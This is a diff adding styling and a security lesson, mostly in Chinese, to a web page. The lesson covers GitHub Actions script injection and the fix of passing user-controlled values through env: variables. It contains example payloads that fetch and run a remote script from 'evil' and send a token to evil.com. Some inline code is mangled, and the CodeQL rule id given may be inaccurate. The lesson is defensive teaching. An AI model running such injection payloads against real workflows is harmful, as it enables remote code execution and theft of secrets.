@@ -160,6 +160,17 @@
   a { color: var(--accent); }
   h1 { font-size: var(--fs-2xl); margin-bottom: 8px; }
   .meta { color: #8b949e; font-size: var(--fs-xs); margin-bottom: 24px; }
+  .lesson-body { margin-top: 32px; padding-top: 8px; border-top: 1px solid rgba(0,229,255,0.1); }
+  .lesson-body h2 { font-size: var(--fs-md); color: var(--accent); margin: 24px 0 8px; }
+  .lesson-body h3 { font-size: var(--fs-sm); color: var(--fg-1); margin: 20px 0 6px; }
+  .lesson-body p, .lesson-body li { color: #c9d1d9; font-size: var(--fs-sm); }
+  .lesson-body ul, .lesson-body ol { padding-left: 22px; }
+  .lesson-body pre { background: rgba(0,229,255,0.06); border: 1px solid rgba(0,229,255,0.12); border-radius: var(--r-sm); padding: 12px 14px; overflow-x: auto; }
+  .lesson-body code { font-family: var(--font-mono); font-size: var(--fs-2xs); color: #c9d1d9; }
+  .lesson-body blockquote { margin: 12px 0; padding: 10px 14px; background: rgba(0,229,255,0.06); border-radius: var(--r-sm); color: #8b949e; }
+  .lesson-body table { border-collapse: collapse; width: 100%; margin: 12px 0; font-size: var(--fs-xs); }
+  .lesson-body th, .lesson-body td { border: 1px solid rgba(0,229,255,0.12); padding: 6px 8px; text-align: left; color: #c9d1d9; }
+  .lesson-body hr { border: 0; border-top: 1px solid rgba(0,229,255,0.12); margin: 20px 0; }
   .evidence { background: rgba(0,229,255,0.14); color: var(--accent); border-radius: var(--r-sm); padding: 2px 6px; font-size: var(--fs-2xs); cursor: help; }
   .section { margin-bottom: 24px; }
   .section h2 { font-size: var(--fs-md); color: var(--accent); margin-bottom: 8px; }
@@ -178,6 +189,25 @@
 <div class="section">
   <h2>Summary</h2>
   <p>当 GitHub Actions 的 `run:` 脚本中直接使用 `${{ github.event.issue.body }}` 或 `${{ github.event.pull_request.title }}` 等用户可控变量时，攻击者可以通过构造包含 shell 元字符（如 `` ` ``, `$(...)`…</p>
+</div>
+<div class="lesson-body">
+<h2>Root Cause</h2><p>当 GitHub Actions 的 <code>run:</code> 脚本中直接使用 <code>${{ github.event.issue.body }}</code> 或 <code>${{ github.event.pull_request.title }}</code> 等用户可控变量时，攻击者可以通过构造包含 shell 元字符（如 `<code> </code> `<code>, </code>$(...)<code>, </code>;`）的 issue/PR 内容来注入任意命令。</p><pre><code class="language-yaml"># GitHub Actions Script Injection — Use env Variables Instead of Inline Interpolation
+- run: |
+    BODY="${{ github.event.issue.body }}"
+    echo "$BODY" | grep "keyword"</code></pre><p>如果 issue body 是 <code>"$(curl http://evil/payload.sh | sh)"</code>，展开后变成：</p><pre><code class="language-bash">BODY="$(curl http://evil/payload.sh | sh)"</code></pre><h2>Solution</h2><p>将用户可控的上下文变量通过 <code>env:</code> 传递，而不是直接内联到 <code>run:</code> 脚本中：</p><pre><code class="language-yaml"># ✅ 安全：通过 env 变量传递
+- run: |
+    echo "$ISSUE_BODY" | grep "keyword"
+  env:
+    ISSUE_BODY: ${{ github.event.issue.body }}</code></pre><p>GitHub Actions 在 <code>env:</code> 中对 <code>${{ }}</code> 求值并写入环境变量值，shell 不会对其中的特殊字符做二次解析。</p><h3>完整修复示例</h3><pre><code class="language-yaml"># Before (vulnerable)
+- run: |
+    TITLE="${{ github.event.issue.title }}"
+    if echo "$TITLE" | grep -qi "bug"; then echo "is bug"; fi
+
+# After (safe)
+- run: |
+    if echo "$ISSUE_TITLE" | grep -qi "bug"; then echo "is bug"; fi
+  env:
+    ISSUE_TITLE: ${{ github.event.issue.title }}</code></pre><h3>CodeQL 检测规则</h3><p>GitHub CodeQL 的 "Code injection" 规则（<code>cs/code-injection</code>）会自动检测此类问题。触发条件：</p><ul><li><code>${{ }}</code> 表达式出现在 <code>run:</code> 脚本中</li><li>表达式来源是用户可控的上下文（<code>github.event.issue.body</code>, <code>github.event.pull_request.title</code>, <code>github.event.comment.body</code> 等）</li><li>评级：<strong>critical</strong></li></ul><h2>Lesson</h2><h2>Verification</h2><ol><li>Create a workflow with <code>run: echo ${{ github.event.issue.title }}</code> — confirm CodeQL alerts on code injection</li><li>Refactor to use <code>env: { TITLE: ${{ github.event.issue.title }} }</code> + <code>run: echo "$TITLE"</code> — confirm alert clears</li><li>Test with a malicious payload in issue title containing <code>" &amp;&amp; curl evil.com/$TOKEN"</code> — confirm env quoting prevents injection</li><li>Verify CodeQL cs/code-injection rule is not dismissed as false positive in the PR</li></ol><ul><li>任何时候 <code>${{ }}</code> 的值来自用户输入（issue body、PR title、comment 等），都必须通过 <code>env:</code> 间接传递</li><li>安全原则：<code>run:</code> 脚本中只使用字面量和环境变量，不内联表达式</li><li>CodeQL 的 cs/code-injection 规则是可靠的——不要 dismiss 为 false positive</li><li>这条规则适用于所有 workflow 类型，包括 <code>issue_comment</code>、<code>issues</code>、<code>pull_request</code>、<code>discussion</code> 等事件</li></ul>
 </div>
 <div class="section"><h2>Source</h2><p><a href="https://github.com/Ikalus1988/MisakaNet/blob/main/lessons/core/github-actions-code-injection.md">View on GitHub →</a></p></div>
 <div class="section"><h2>Search</h2><p><a href="/search/?q=GitHub Actions Script Injection — Use env Variables Instead of Inline Interpolation">Find related lessons →</a></p></div>
